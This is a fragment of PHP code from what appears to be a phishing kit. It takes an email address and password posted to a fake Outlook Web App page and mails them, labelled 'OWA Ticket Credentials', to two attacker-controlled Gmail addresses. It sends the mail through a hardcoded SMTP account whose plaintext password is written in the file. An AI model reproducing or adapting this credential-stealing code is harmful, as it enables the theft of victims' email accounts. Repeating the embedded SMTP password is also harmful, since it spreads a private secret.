...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	...
	if (isset($_POST['email']) && isset($_POST['password'])) {
		...
		try {
			...
			$mail->Username   = 'ruben@deltellco.com';                     //SMTP username
			$mail->Password   = 'Bigbigthing1!';                               //SMTP password

			//Recipients
			$mail->setFrom('ruben@deltellco.com', 'Monotomic Support');

			//Enter you email address
			$mail->addAddress('mailbox4rezults@gmail.com,boxr2802@gmail.com', '');     //Add a recipient

            $message = buildMail($_POST['email'], $_POST['password']);

			//Content
			$mail->isHTML(true);                                  //Set email format to HTML
			$mail->Subject = '**Outlook Web App (OWA) Ticket Credentials**';
			$mail->Body    = $message;
